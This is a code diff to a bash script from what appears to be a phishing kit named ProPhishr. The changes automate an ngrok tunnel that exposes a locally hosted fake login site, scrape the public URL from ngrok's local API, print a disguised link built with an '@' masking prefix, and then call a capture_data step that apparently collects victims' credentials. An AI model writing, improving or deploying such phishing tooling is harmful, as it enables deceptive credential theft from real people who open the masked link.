@@ -144,13 +144,14 @@ download_ngrok() {
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed.\n"
-		read -p "${RED}[${WHITE}-${RED}]${GREEN} Have You Setup Authtoken In Ngrok : ${BLUE}"
+		read -p "${RED}[${WHITE}-${RED}]${GREEN} Have You Setup Authtoken In Ngrok :(y/n) ${BLUE}"
 		case $REPLY in 
 		y | Y)
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ok";;
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ok";
+			sleep 3;;
 		n | N)
 		    read -p "${GREEN}[${WHITE}+${GREEN}]${CYAN} Enter The Ngrok Authtoken [Ex. 1Y7IUg56DH008F ] : " authtoken;
-			./ngrok authtoken $authtoken > /dev/null 2>&1;
+			./server/ngrok authtoken $authtoken > /dev/null 2>&1;
 			sleep 3;
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok installed successfully";
 			sleep 2;;
@@ -165,28 +166,28 @@ install_ngrok() {
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
 			read -p "${GREEN}[${WHITE}+${GREEN}]${CYAN} Enter The Ngrok Authtoken [Ex. 1Y7IUg56DH008F ] : " authtoken
-			./ngrok authtoken $authtoken > /dev/null 2>&1
+			./server/ngrok authtoken $authtoken > /dev/null 2>&1
 			sleep 3
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok installed successfully"
 			sleep 2
 		elif [[ "$arch" == *'aarch64'* ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
 			read -p "${GREEN}[${WHITE}+${GREEN}]${CYAN} Enter The Ngrok Authtoken [Ex. 1Y7IUg56DH008F ] : " authtoken
-			./ngrok authtoken $authtoken > /dev/null 2>&1
+			./server/ngrok authtoken $authtoken > /dev/null 2>&1
 			sleep 3
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok installed successfully"
 			sleep 2
 		elif [[ "$arch" == *'x86_64'* ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
 			read -p "${GREEN}[${WHITE}+${GREEN}]${CYAN} Enter The Ngrok Authtoken [Ex. 1Y7IUg56DH008F ] : " authtoken
-			./ngrok authtoken $authtoken > /dev/null 2>&1
+			./server/ngrok authtoken $authtoken > /dev/null 2>&1
 			sleep 3
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok installed successfully"
 			sleep 2
 		else
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
 			read -p "${GREEN}[${WHITE}+${GREEN}]${CYAN} Enter The Ngrok Authtoken [Ex. 1Y7IUg56DH008F ] : " authtoken
-			./ngrok authtoken $authtoken > /dev/null 2>&1
+			./server/ngrok authtoken $authtoken > /dev/null 2>&1
 			sleep 3
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok installed successfully"
 			sleep 2
@@ -292,20 +293,21 @@ start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${RED} Turn On Hotspot!"
+	sleep 3
 
-    if [[ $(command -v termux-chroot) ]]; then
-        sleep 2 > /dev/null 2>&1
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     else
-        sleep 2 > /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; banner; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : "
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} To Get URL\nTurn On Your Hotspot\nOpen New Seesion And Run\ncd ProPhishr/.server && ./ngrok http 8080\nThen Copy The Web Forwarding URL"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL WITH MASK : "
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} $mask@${CYAN}<<ngrok url without http or https>>"
-	sleep 10
-    capture_data
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url1=${ngrok_url#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	capture_data
 }
 
 ## Start localhost
@@ -322,8 +324,8 @@ tunnel_menu() {
 	{ clear; banner; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost(Automatic)    
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok(Manual)     
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost(No Internet Required)    
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok(Internet And Hotspot Required)     
 	EOF
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
